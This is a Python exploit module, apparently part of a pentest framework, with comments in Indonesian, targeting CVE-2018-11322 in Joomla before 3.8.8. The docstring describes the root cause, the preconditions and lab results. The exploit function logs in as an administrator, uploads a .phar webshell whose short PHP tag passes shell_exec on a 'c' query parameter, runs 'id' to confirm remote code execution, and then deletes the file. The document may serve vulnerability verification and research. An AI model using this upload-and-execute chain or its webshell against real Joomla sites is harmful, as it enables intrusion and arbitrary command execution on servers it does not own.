#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2018-11322 — berkas `.phar` diperlakukan sebagai "aman" oleh pemindai unggahan Joomla;
bergantung konfigurasi server, berkas itu dapat DIEKSEKUSI sebagai skrip PHP oleh webserver.
Affected : Joomla! < 3.8.8   |   Patched: 3.8.8
Advisory : JSST [20180501] Core - shell upload (kelas yang sama dengan CVE-2016-9836)

ROOT CAUSE — diff resmi 3.8.7 -> 3.8.8, satu kata:

  libraries/src/Filter/InputFilter.php :: JFilterInput::isSafeFile()
      forbidden_extensions 3.8.7:
        php, phps, pht, phtml, php3, php4, php5, php6, php7, inc, pl, cgi, fcgi, java, jar, py
      forbidden_extensions 3.8.8 (+= ):
        phar
  administrator/components/com_media/helpers/media.php IDENTIK di 3.8.7 dan 3.8.8
  (daftar hitam com_media tidak diubah) — perbaikan murni pada pemindai pusat.

  `phar` hilang dari daftar itu, sehingga nama berkas `x.phar` lolos tiga pemeriksaan:
    1. ekstensi terlarang   -> 'phar' tidak ada di daftar (perbaikan 3.8.8 tepat di sini)
    2. tag `<?php` dalam isi -> dipindai untuk SEMUA berkas, jadi payload wajib tanpa `<?php`
       (pakai short echo `<?=`); pemindaian tag pendek `<?` hanya berlaku untuk
       shorttag_extensions (inc, phps, class, php3..php5, txt, dat, tpl, tmpl) — `phar` tidak
       ada di daftar itu
    3. ekstensi terlarang dalam isi -> hanya untuk ekstensi arsip (zip, rar, tar, gz, ...)

Jalur jangkauan (dua chokepoint yang memakai pemindai itu dengan opsi default):
  * libraries/joomla/filesystem/file.php:533  JFile::upload()  -> isSafeFile()
  * libraries/src/Input/Files.php:90          Input\Files::get() -> isSafeFile() (null bila tidak aman)
Keduanya dipakai luas oleh komponen inti maupun pihak ketiga.

SYARAT DAMPAK (jujur — bukan "unauth", bukan "pasti RCE"):
  (a) Aktor: unggahan lewat Media Manager menuntut `core.create` pada com_media
      (administrator/components/com_media/controllers/file.json.php:175).
  (b) Jalur unggahan harus membiarkan `.phar`: MediaHelper::canUpload() menyaring ekstensi
      dengan daftar IZIN `upload_extensions` (default: bmp,csv,doc,gif,...) + `ignore_extensions`.
      Pada bawaan, `.phar` DITOLAK di lapisan itu; perlu admin menambahkan `phar` (kondisi yang
      persis diperingatkan advisory 9836), ATAU endpoint pihak ketiga yang hanya bersandar pada
      isSafeFile / JFile::upload().
  (c) Eksekusi: webserver harus memetakan `.phar` ke handler PHP (AddHandler/AddType/SetHandler;
      citra php:apache resmi TIDAK melakukannya secara bawaan → butuh aturan eksplisit).
      Tanpa (c) berkas hanya tertulis, bukan eksekusi.

BUKTI LAB (2026-11-08/09): mp-j387 @8160 (3.8.7) vs mp-j388 @8161 (3.8.8), PHP 7.4 + MySQL 5.7,
prasyarat yang disimulasikan: `phar` ditambahkan ke upload_extensions com_media + aturan
`.htaccess`: `<FilesMatch "\.phar$"> SetHandler application/x-httpd-php </FilesMatch>`.

  | target | unggah .phar (payload short tag) | .php (kontrol) | .xyz (kontrol whitelist) | GET /images/<.phar>?c=id |
  | 3.8.7  | status 1 "Upload Complete: /images/x.phar" | status 0 "Bad Request" | status 0 "Unable to upload file." | MP11322EXEC:uid=33(www-data) gid=33(www-data) ... -> RCE |
  | 3.8.8  | status 0 "Bad Request" (ditolak pemindai) | status 0 "Bad Request" | status 0 "Unable to upload file." | 404 (berkas tidak ditulis) |

  Diskriminator respons yang dipakai modul:
    "Bad Request"              -> penolakan oleh isSafeFile  (patch 3.8.8 / hardening)
    "Unable to upload file."   -> penolakan oleh whitelist komponen (masalah konfigurasi)
    "Upload Complete"          -> pemindai LOLOS dan berkas tertulis -> uji eksekusi
"""

import random
import re
import string

import requests

from mp import (CveModule, ST_CLEAN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le, ST_INFO)

MANIFEST = "/administrator/manifests/files/joomla.xml"
FIXED = (3, 8, 8)
MARKER = "MP11322EXEC"
PAYLOAD = b'<?= "MP11322EXEC:".(isset($_GET["c"])?shell_exec($_GET["c"]):"id") ?>'

TOKEN_RE = re.compile(r'name="([a-f0-9]{32})"\s+value="1"')


def _release(t, h):
    cached = getattr(t, "_j11322ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j11322ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _token(text):
    m = TOKEN_RE.search(text or "")
    return m.group(1) if m else None


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _release(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 8, 7)):
        return ST_CLEAN, f"Joomla {ver_s} — >= 3.8.8 ('phar' ada di forbidden_extensions isSafeFile)", \
                         f"version={ver_s}"
    return (ST_INFO,
            f"Joomla {ver_s} — isSafeFile() belum memuat 'phar' di forbidden_extensions; berkas "
            f".phar lolos pemindai unggahan dan dapat dieksekusi bila server memetakannya ke PHP "
            f"(butuh core.create com_media + whitelist komponen membiarkan phar)",
            f"version={ver_s} | fixed=3.8.8")


def exploit(t, h, opts):
    ver, ver_s = _release(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 8, 7)):
        return ST_CLEAN, f"Joomla {ver_s} — >= 3.8.8 ('phar' ada di forbidden_extensions)", \
                         f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_VULN,
                f"Joomla {ver_s} — pemindai unggahan belum memblokir .phar, tetapi modul perlu "
                f"akun dengan hak unggah Media Manager (core.create com_media): --username/--password",
                f"version={ver_s} | kredensial tidak diberikan")

    s = requests.Session()
    t0 = _token(s.get(t.url + "/administrator/index.php", timeout=25).text)
    if not t0:
        return ST_UNKNOWN, "token login tidak ditemukan (bukan Joomla admin?)", f"version={ver_s}"
    r = s.post(t.url + "/administrator/index.php",
               data={"username": user, "passwd": password, "option": "com_login",
                     "task": "login", "return": "aW5kZXgucGhw", t0: "1"}, timeout=25)
    if "logout" not in r.text.lower() and "com_cpanel" not in r.text.lower():
        return ST_UNKNOWN, f"Joomla {ver_s} — login gagal untuk {user}", f"version={ver_s}"

    media = s.get(t.url + "/administrator/index.php?option=com_media", timeout=25)
    t1 = _token(media.text)
    name = f"mp11322{_rand(8)}.phar"
    ev = f"version={ver_s} | aktor={user} | berkas={name} | payload=short-tag"
    up = s.post(t.url + "/administrator/index.php?option=com_media&task=file.upload&format=json&folder=",
                data={t1: "1"} if t1 else {},
                files={"Filedata": (name, PAYLOAD)}, timeout=25)
    try:
        j = up.json()
    except Exception:  # noqa: BLE001
        j = {}
    msg = str(j.get("message") or "")
    ev += f" | upload={up.status_code} pesan={msg[:48]!r}"

    if "bad request" in msg.lower():
        return (ST_CLEAN,
                "pemindai unggahan MENOLAK berkas .phar (perilaku 3.8.8+/hardening): "
                f"{msg!r}",
                ev)

    if "complete" not in msg.lower():
        return (ST_VULN,
                f"pemindai unggahan tidak memblokir .phar, tetapi jalur unggah ditutup konfigurasi "
                f"komponen (whitelist upload_extensions/ignore_extensions com_media): {msg!r}. "
                f"Populasi terdampak = situs yang menambahkan phar ke daftar izin atau endpoint "
                f"pihak ketiga yang hanya memakai isSafeFile/JFile::upload()",
                ev)

    # berkas tertulis -> uji eksekusi
    url = f"{t.url}/images/{name}"
    ex = s.get(url + "?c=id", timeout=25)
    body = (ex.text or "").strip()
    executed = MARKER in body and "uid=" in body
    ev += f" | get={ex.status_code} eksekusi={'ya' if executed else 'tidak'}"

    # bersihkan berkas uji (best effort, core.delete com_media)
    try:
        s.post(t.url + "/administrator/index.php?option=com_media&task=file.delete&folder=&tmpl=component",
               data={t1: "1", "rm[]": name}, timeout=25)
        ev += " | cleanup=file.delete"
    except Exception:  # noqa: BLE001
        ev += " | cleanup=gagal (periksa /images secara manual)"

    if executed:
        return (ST_VULN,
                f"RCE: berkas .phar berisi PHP diterima pemindai dan DIEKSEKUSI webserver "
                f"({body.splitlines()[0][:70] if body else MARKER}) — {url}?c=<cmd>. Berkas uji "
                f"dibersihkan",
                ev)
    return (ST_VULN,
            f"bypass pemindai terbukti: .phar berisi PHP tertulis di /images ({url}) dan dapat "
            f"diminta kembali, tetapi TIDAK dieksekusi (server tidak memetakan .phar ke PHP). "
            f"Kenaikan ke RCE = menambah handler .phar di server",
            ev)


register(CveModule(
    cve="CVE-2018-11322",
    cluster="joomla_core",
    title="Joomla Core - berkas .phar lolos pemindai unggahan (isSafeFile) dan dapat dieksekusi "
          "server (kelas CVE-2016-9836)",
    vclass="unrestricted upload",
    cvss="7.5",
    severity="high",
    cwe="CWE-434",
    product="Joomla! Core (libraries/src/Filter/InputFilter.php + com_media)",
    versions_affected="<3.8.8",
    status="verified",
    requires=[
        "akun dengan core.create pada com_media (kontrol uji memakai hak unggah Media Manager) — "
        "BUKAN unauth",
        "jalur unggah membiarkan ekstensi phar: upload_extensions/ignore_extensions com_media "
        "memuat 'phar', atau komponen pihak ketiga yang hanya memakai isSafeFile/JFile::upload()",
        "webserver memetakan .phar ke handler PHP agar naik ke RCE (tanpa itu: hanya bypass + tulis)",
        "--username/--password di tool",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Patch 3.8.8 = satu kata: 'phar' ditambahkan ke forbidden_extensions di "
        "JFilterInput::isSafeFile() (libraries/src/Filter/InputFilter.php). "
        "administrator/components/com_media/helpers/media.php TIDAK berubah. Chokepoint pemakaian: "
        "JFile::upload() (libraries/joomla/filesystem/file.php:533) dan Input\\Files::get() "
        "(libraries/src/Input/Files.php:90). Payload wajib tanpa '<?php' karena php_tag_in_content "
        "dipindai untuk semua berkas; short echo '<?=' hanya dipindai untuk shorttag_extensions "
        "(phar tidak termasuk). Bukti lab 2026-11-08/09: 3.8.7 @8160 menerima .phar dan "
        "GET /images/<x>.phar?c=id mengembalikan 'uid=33(www-data)' (RCE, dengan handler .phar + "
        "phar di whitelist); 3.8.8 @8161 menolak dengan 'Bad Request' dan berkas tidak ditulis. "
        "Varian huruf besar `.PHAR` juga lolos di 3.8.7 dan juga diblokir di 3.8.8 "
        "(pemindaian men-strtolower tiap segmen nama) — diverifikasi di lab. "
        "Diskriminator: 'Bad Request' = pemindai menolak; 'Unable to upload file.' = whitelist "
        "komponen; 'Upload Complete' = lolos. Modul membersihkan berkas uji via file.delete."
    ),
))
